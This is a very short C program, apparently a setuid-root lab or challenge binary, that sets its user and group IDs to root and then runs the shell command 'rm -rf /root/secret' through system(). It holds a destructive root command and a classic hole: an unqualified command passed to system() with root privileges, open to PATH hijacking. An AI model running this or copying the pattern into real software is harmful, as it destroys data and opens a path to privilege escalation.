#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    setgid(0);
    setuid(0);

    return system("rm -rf /root/secret");
}
